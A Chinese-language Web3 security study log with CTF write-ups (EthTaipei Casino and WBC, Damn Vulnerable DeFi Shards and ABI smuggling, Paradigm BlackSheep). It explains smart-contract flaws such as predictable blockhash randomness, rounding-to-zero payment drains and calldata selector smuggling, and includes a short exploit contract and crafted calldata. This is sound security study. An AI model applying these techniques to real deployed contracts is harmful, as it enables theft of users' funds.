---
timezone: Asia/Shanghai
---

# kkontheway

1. 自我介绍
   Hi, I'm kkontheway.I am currently working as a Cloud security engineer. I am interested in learning about the Web3 Security.
2. 你认为你会完成本次残酷学习吗？
    I will try my best to complete the cruel learning.

## Notes

<!-- Content_START -->

### 2024.08.29

A: Damn Vulnerable DeFi V4(1/18)
---



B:EthTaipei CTF 2023(2/5)
---

**1. Casino**

**Goal**

```solidity
require(IERC20(wNative).balanceOf(address(casino)) == 0);
```
**Solution**

合约模拟了一个老虎机的运行，玩家扮演赌徒，初始状态下玩家有1个`wNative Token`，而赌场有`1000`个，目标就是清空赌场手里的`1000`个`wNative`代币。

有了目标，我们就可以来看一下代码是如何实现的赌场逻辑的:

<details>

```solidity
function play(address token, uint256 amount) public checkPlay {
        _bet(token, amount);
        CasinoToken cToken = isCToken(token) ? CasinoToken(token) : CasinoToken(_tokenMap[token]);
        // play

        cToken.get(msg.sender, amount * slot());
    }

    function slot() public view returns (uint256) {
        unchecked {
            uint256 answer = uint256(blockhash(block.number - 1)) % 1000;
            uint256[3] memory slots = [(answer / 100) % 10, (answer / 10) % 10, answer % 10];
            if (slots[0] == slots[1] && slots[1] == slots[2]) {
                if (slots[0] == 7) {
                    return 100;
                } else {
                    return 10;
                }
            } else if (slots[0] == slots[1] || slots[1] == slots[2] || slots[0] == slots[2]) {
                return 3;
            } else {
                return 0;
            }
        }
    }

    function _bet(address token, uint256 amount) internal {
        require(isAllowed(token), "Token not allowed");
        CasinoToken cToken = CasinoToken(token);
        try cToken.bet(msg.sender, amount) {}
        catch {
            cToken = CasinoToken(_tokenMap[token]);
            deposit(token, amount);
            cToken.bet(msg.sender, amount);
        }
    }
```

</details>

玩家首先调用`play()`函数参加赌博，`play()`会调用`_bet()`通过`burn`玩家输入的`token`(我们可以想象成筹码)来实现下注的操作，随后调用`slot()`函数(也就是开始摇动老虎机)，老虎机的判断逻辑是，首先通过`block.number`获取一个随机数(伪随机)，如果三个数字都是`7`那么会翻`100` 倍，但是如果是`7`之外的数字，比如出来的是`666，555，444`只会翻十倍，两个数字一样翻三倍，其余的结果翻两倍。

其实看到这里我就判断解决这道题目的关键就是`block.number`，因为伪随机数漏洞有点太明显，可以通过观看[PatrickAlphaC的视频课程](https://youtu.be/pUWmJ86X_do?t=23418)进一步的了解`Weak Randomnes`。简单来说在区块链中不存在真正意义上的随机数，因为链上的一切都是公开的，题目中使用的`blocknumber`也是一个可被预测和计算的数字，所以我们能够通过计算`block.number`来得知我们在哪一个`block`进行下注能够一定得到`777`的最好结果。

现在我们找到了一条能够让我们赌注翻一百倍的方式！但是我们的初识赌注只有`1 wNative`，就算计算出一次`777`，翻一百倍我们也只能获取到100个`token`，但是我们的目标有整整`1000`个！我们得想想办法。

后面我把目光放在了`_bet()`函数中:
<details>

```solidity
function _bet(address token, uint256 amount) internal {
				//检查是否是允许的underlying Token
        require(isAllowed(token), "Token not allowed");
       
        CasinoToken cToken = CasinoToken(token);
        //如果直接调用失败（可能是因为token是原始代币而不是CasinoToken），则：从_tokenMap获取对应的CasinoToken地址调用deposit函数将原始代币转换为CasinoToken然后再调用CasinoToken的bet函数
        try cToken.bet(msg.sender, amount) {}
        catch {
            cToken = CasinoToken(_tokenMap[token]);
            deposit(token, amount);
            cToken.bet(msg.sender, amount);
        }
    }
```
</details>

起初我在这里没有看到问题，但是后面我把目光放在了`underlying token`的实现中:

<details>

```solidity
contract WrappedNative is ERC20("Wrapped Native Token", "WNative"), Ownable {
    using Address for address payable;

    fallback() external payable {
        deposit();
    }

    function mint(address receiver, uint256 amount) external onlyOwner {
        _mint(receiver, amount);
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        _burn(msg.sender, amount);
        payable(msg.sender).sendValue(amount);
    }
}
```
</details>

`try…catch` 的作用是如果报错那么执行`catch{}`中的内容，但是如果不返回报错呢？

我们可以看到在`wNative`的实现中有一个`fallback()`函数，`fallback`会在调用合约不存在的函数时触发，详细内容可以查看[WTF的文章](https://www.wtf.academy/docs/solidity-102/Fallback/)，这下我们的解题思路就明确了。

1. 调用`play()`函数，传入`wNative token`和大于0的`amount`，这里我们可以传入一个500
2. 然后使用循环也好或者爆破也可以，找到一个返回非0的`block.number`
3. 最后直接调用`withdraw`即可直接取出所有的`wNative`
4. 后面发现也不需要管`block.number`，直接在调用play的时候传入一个足够大的数字，什么`5k`，`1w`的都可以，然后直接`withdraw`就可以了

**Exp**
In WriteUp/kkontheway/

**2. WBC**

**Goal**

```solidity
function solve() public override {
        require(wbc.scored());
        super.solve();
    }
```

**Solution**

首先阅读代码，要让`wbc.scored=true`有两种方式：

```solidity
1. 成功执行_homeBase() 
2. block.timestamp % 23_03_2023 == 0
```

因为第二个几乎不可能，所以我们走第一条路成功调用`_homeBase()` 

代码模拟的是一个棒球比赛，`homeBase`也就是本垒打，我们要先越过一垒，二垒和三垒，所以我们就一个一个的绕过。

首先我们要注册成为`Player`,调用`bodyCheck()`

<details>

```solidity
function bodyCheck() external {
        require(msg.sender.code.length == 0, "no personal stuff");
        require(uint256(uint160(msg.sender)) % 100 == 10, "only valid players");

        player = msg.sender;
    }
```

</details>

`bodyCheck()`检查了`msg.sender.code.length == 0`，我们可以通过在`constructor`中调用的方式来绕过，因为智能合约在执行构造函数的阶段`code.length`为0。

还有一个检查是要求`uint256(uint160(msg.sender)) % 100 == 10` ，一个特定的地址，在`EVM`中创建地址有两种一种是`Create`一种是`Create2`，具体可查看这篇文章即可了解原理如何生成一个我们想要的地址:[Vanity-address](https://0xfoobar.substack.com/p/vanity-addresses).

接下来我们要调用`ready()`, 进入比赛

<details>

```solidity
function ready() external {
        require(IGame(msg.sender).judge() == judge, "wrong game");
        _swing();
    }
```

</details>

通过这个我们可以知道`caller`必须是一个合约，同时要满足`IGame`接口，并且合约的`judge()`返回值==`judge`。

接下来就进入了`swing()`

<details>

```solidity
function _swing() internal onlyPlayer {
        _firstBase();
        require(scored, "failed");
    }
```

</details>

`swing()`会调用`_firstBase()`

<details>

```solidity
function _firstBase() internal {
        uint256 o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o = 1001000030000000900000604030700200019005002000906;
        uint256 o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o = 460501607330902018203080802016083000650930542070;
        uint256 o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o = 256; // 2^8
        uint256 o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o = 1;
        _secondBase(
            uint160(
                o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o
                    + o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o * o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o
                    - o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o
            )
        );
    }
```

</details>

`_firstBase()`函数会讲计算之后的结果传递提`_secondBase()`，我们来看看`_secondBase()`干了什么：

<details>

```solidity
function _secondBase(uint160 input) internal {
        require(IGame(msg.sender).steal() == input, "out");
        _thirdBase();
    }
```

</details>

要求传入的值和我们的攻击合约的`steal`返回值是一样的，才能调用三垒`_thirdBase()`, 这没什么难度计算一下就好，我们来看三垒的实现：

<details>

```solidity
function decode(bytes32 data) external pure returns (string memory) {
        assembly {
            mstore(0x20, 0x20)
            mstore(0x49, data)
            return(0x20, 0x60)
        }
    }
function _thirdBase() internal {
        require(keccak256(abi.encodePacked(this.decode(IGame(msg.sender).execute()))) == keccak256("HitAndRun"), "out");
        _homeBase();
    }
```

</details>

`_thirdBase`调用了攻击合约的`execute`函数，并且用`wbc::decode`函数对他进行解码，要求计算后的`keccak256`的值得和`HitAndRun`一致，所以我们来看看`decode`函数在干什么具体在干嘛。

我们可以从[evm.codes](https://www.evm.codes/)上看到：

```solidity
Stack input
offset: offset in the memory in bytes.
value: 32-byte value to write in the memory.
```

第一个参数是memory中的offset，第二个参数是值

所以decode的的作用就是将data转换成EVM格式的字符串：

```solidity
assembly {
            mstore(0x20, 0x20)
            //在内存中0x20的位置写入值0x20
            mstore(0x49, data)
            //在内存中0x49的位置写入data
            return(0x20, 0x60)
            //从0x20的位置返回0x60长度的值
        }
  // x 代表我们的data
  0x20 0000000000000000000000000000000000000000000000000000000000000020 0x3f
  0x40 000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 0x5f
  0x60 xxxxxxxxxxxxxxxxxx0000000000000000000000000000000000000000000000 0x7f
       
```

我们知道在`EVM`中字符串会被打包成三个`32`字节，第一个`32`字节是偏移量代表字符串从哪里开始，第二个`32`字节是字符串的长度，第三个是字符串的实际内容。所以我们只要传入`HitAndRun`的长度和实际内容将他们嵌进去就好了。所以我们可以通过传入:`0x09(HitAndRun的长度)`和`486974416E6452756E` (HitAndRun的ASCII码)就可以了：

```solidity
0000000000000000000000000000000000000000000009486974416e6452756e
```

我们把它嵌入到上面的内存中看看:

```solidity
// x 代表我们的data
  0x20 0000000000000000000000000000000000000000000000000000000000000020 0x3f
  0x40 0000000000000000000000000000000000000000000000000000000000000009 0x5f
  0x60 486974416e6452756e0000000000000000000000000000000000000000000000 0x7f
```

这个也就代表着我们的字符串`HitAndRun`了

到此我们成功绕过了前面的三垒，接下来就差最后一个`_homebase()`了

<details>

```solidity
function _homeBase() internal {
        scored = true;

        (bool succ, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
        require(succ, "out");
        require(
            keccak256(abi.encodePacked(abi.decode(data, (string)))) == keccak256(abi.encodePacked("I'm the best")),
            "out"
        );

        (succ, data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
        require(succ, "out");
        require(
            keccak256(abi.encodePacked(abi.decode(data, (string))))
                == keccak256(abi.encodePacked("We are the champion!")),
            "out"
        );
    }
```

</details>

`_homeBase()`会通过`staticcall`调用攻击合约的`shou()`函数两次，那我们怎么让同一个函数在两次调用的时候返回不一样的值呢，在两次调用的时候只有一个东西发生了变化，就是`gas`，我们可以通过一笔交易中`gas`的剩余来判断这是第一次还是第二次调用，从而完成条件到此我们已经达成了完成这道题目的所有必要条件:

1. `constructor`中调用`bodycheck`成为`player`
2. `judge()`返回`block.coinbase`
3. `steal()`返回
4. `execute()`返回`0000000000000000000000000000000000000000000009486974416e6452756e`
5. `shout()`函数加一个判断`gas`剩余的`if`判断，然后返回不同值
6. 写出EXP

**Exp**

C:MetaTrust 2023 (22)
---

### 2024.08.30

A: Damn Vulnerable DeFi V4(1/18)
---
**Shards**
## Goal
<details>

```solidity
function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
```
</details>

## Soultion

整体逻辑就是拥有`NFT`的人可以挂一个单，然后选择把它分成多少片(`shards`)，如果一个`buyer`把所有的`shards`都买下来，那么他就拥有了这个`NFT`。

一开始我没能看出来有什么问题，测试了几乎所有的`external`函数，看起来貌似是正常的。

后面我想到了题目中特地强调了`100万`，我开始深入研究他的数学计算过程，虽然他符合先乘后除的规范，但是还是存在了问题.

当我们计算购买的时候时候,计算我们要付多少的`DVT`：

<details>

```solidity
//ShardsNFTMarketplace::fill()
paymentToken.transferFrom(
            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
        );
//want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards
//分解一下
//want * _toDVT(offer.price, _currentRate) / offer.totalShards
//want * (offer.price * _currentRate / 1e6) / offer.totalShards
//want * (1_000_000e6 * 75e15 / 1e6) / 10_000_000e18
// 所以我们想要让结果 = 0的话，得分子 < 分母
// 所以 want < 130
```

</details>

经过计算可以知道，只要我们传入的`want` < `130`，我们就可以在获得`want`的同时不付任何的`DVT`，因我们本身也没有`DVT`。

那么下一步我们来看看`cancel`的时候，我们的`want`能换回来多少钱

<details>

```solidity
//ShardsNFTMarketplace::cancel()
paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
// purchase.shards * purchase.rate / 1e6
// 100 * 75e15 / 1e6
// 7.5e12
```
</details>

我们可以取回`7.5e12`个`DVT`，这里的`100`是随便定的，只要小于`130`都行

账户里还有多少 `7.5e20 - 7.5e12 = 7.499999925E20`

那我们还需要多少`shards`才能取出来呢

<details>

```solidity
want * 75e15 / 1e6 = 750e18 - 7.5e12
want = 9,999,999,900
```

</details>

那我们重新`call`一下`fill()`函数，并且带上我们新的`want`，看看我们的钱够不够


```solidity
9,999,999,900 * (1_000_000e6 * 75e15 / 1e6) / 10_000_000e18 = 74,999,999.25

```
结果 < `7.5e12`

我们完全付得起这个价格，之后我们再取消一次，我们就可以把账户中几乎所有的钱都取出来啦！
**Exp**


C:Paradigm2023 (1/1)
---

**BlackSheep**

**Goal**

```rust
Bank.balance == 0;
```

**Solution**

目的是从`Bank`中取出所有的存款。

我不是很了解`Huff`，所以基本在通过`AI`解题。

开头定义了`withdraw`接口:

```solidity
function withdraw(bytes32,uint8,bytes32,bytes32) payable returns ()
```

代码中定义了`withdraw`会调用`CHECKVALUE`和`CHECKSIG`。

我们的目的是为了调用

```solidity
selfbalance caller
gas call
end jump
```
前提条件
```solidity
 iszero iszero noauth jumpi
```
就是`CHECKSIG`返回`0`，也就是签名和`xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044` 相等，很显然这是不可能的，所以我们就要想想办法。

后面我看到`CHECKSIG`其实根本没有把值推到栈上，而是end返回了:

```solidity
    0xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044 eq correctSigner jumpi
```

如果匹配错误，`0 jumpi` 其实根本不会执行，而是直接执行下一行`end jump` 这说明什么？

我们不需要思考如何绕过验证`signer`，我们只需要让`CHECKVALUE`() `revert`就好了，这样栈顶的值就会是`0`，从而成功绕过，那么让`CHECKVALUE() revert`其实很简单，我们只需要定义一个合约在他的`fallback`函数中`revert` 即可。

**Exp**

```solidity
contract Exploit {
    function exp(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x00,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    fallback() external payable {
        require(msg.value > 30);
    }
}
```

### 2024.08.31

A: Damn Vulnerable DeFi V4(2/18)
---

**ABI smuggling**

**Goal**

```solidity
function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
```

**Code**

- `*SelfAuthorizedVault*`
    - Vault 储存着所有的钱
    - withdraw() 只能由自己`call`
- `*AuthorizedExecutor*`
    - 执行器
    - `execute()` 执行函数先检查权限，再进行调用、
- Setup
    - 初始化合约，通过赋予`player` `sweepFunds()`的权限，赋予`deployer` `withdraw()`的权限

**Solution**

合约不复杂，看完之后觉得解题的关键就是，欺骗合约，认为我们(player)有withdraw的权限，那我们就来思考怎么才能欺骗呢？

在开始解题目之前，有一些基础知识需要了解一下，就是智能合约如何`abi.encode`动态函数，具体原理可以查看degatchi的这片[文章](https://degatchi.com/articles/reading-raw-evm-calldata)，在这里就简单描述一下:

对于静态参数来说:

```solidity
pragma solidity 0.8.17;
contract Example {
    function transfer(uint256 amount, address to) external;
}
// calldata
// 0x
// b7760c8f function selector
// 000000000000000000000000000000000000000000000000000000004d866d92  amount
// 00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45  address
```

对于动态参数:

```solidity
pragma solidity 0.8.17;
contract Example {
    function transfer(string hello) external;
}

// calldata
// 0x
// b7760c8f function selector
// 0000000000000000000000000000000000000000000000000000000000000020 偏移量
// 000000000000000000000000000000000000000000000000000000000000000c 长度
// 48656c6c6f20576f726c64210000000000000000000000000000000000000000 实际内容
```

再来一个例子还是来自degatchi的文章

```solidity
pragma solidity 0.8.17;
contract Example {
    function transfer(uint256[] memory ids, address to) external;
}
// 参数是:
// ids: ["1234", "4567", "8910"]
// to: 0xf8e81D47203A594245E36C48e151709F0C19fBe8
------------------------------------------------------
// calldata
// 0x
// 8229ffb6
// 0000000000000000000000000000000000000000000000000000000000000040 偏移量 64 bytes
// 000000000000000000000000f8e81d47203a594245e36c48e151709f0c19fbe8 address
// 0000000000000000000000000000000000000000000000000000000000000003 // uint256[]的参数数量，这里是3
// 00000000000000000000000000000000000000000000000000000000000004d2 // 1234
// 00000000000000000000000000000000000000000000000000000000000011d7 // 4567
// 00000000000000000000000000000000000000000000000000000000000022ce // 8910
```

ok，了解了基础，我们来看看怎么解决这个问题

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        //calldata
        //fake selector
        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }
```

问题的关键在于，他默认大家传入的参数是没问题的，将用来进行权限判断的`selector`的位置进行了硬编码，这样就导致了我们的绕过。

代码验证的流程是先从`actionData`中取出要调用的函数的`selector`，然后将`selector`和我们的地址还有`target`进行`keccak256`，最后检查`permissions`，所以我们的目的就是欺骗他我们调用的是`sweepFunds` ，其实我们调用的是`withdraw`函数。

```solidity
function getActionId(bytes4 selector, address executor, address target) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(selector, executor, target));
    }
```

我们先看看加入我们传入一个正常的target和actionData应该是什么样的:

```solidity
// 0x
// <function selector>
// 0000000000000000000000000000000000000000000000000000000000000040 偏移量
// 000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx target address
// 0000000000000000000000000000000000000000000000000000000000000040 actionData得长度
// xxxxxxxx00000000000000000000000000000000000000000000000000000000 actionData的实际内容
```

代码中:

```solidity
uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }
// 所以我们只要在这个位置放一个假的selector然后我们再放入我们的恶意calldata就好了
```

那我们开始编写我们的calldata

```solidity
// 0x
// <funtion selector> execute()的selector，不用管前面
// 000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx target就是recovery的地址
// 0000000000000000000000000000000000000000000000000000000000000000 偏移量(先不写
// 0000000000000000000000000000000000000000000000000000000000000000 32个字节的0，我们在这里放32字节的0的愿意是要通过uint256 calldataOffset = 4 + 32 * 3;在动态参数编码的时候，我们可以在偏移量和长度直接添加任意长度的值，因为反正偏移量会最后定位到动态参数长度的32字节的
// <fake selector>0000000000000000000000000000000000000000000000000
// 下面是我们的恶意calldata
// sweepFunds() selector
// recovery address
// amount

```




<!-- Content_END -->
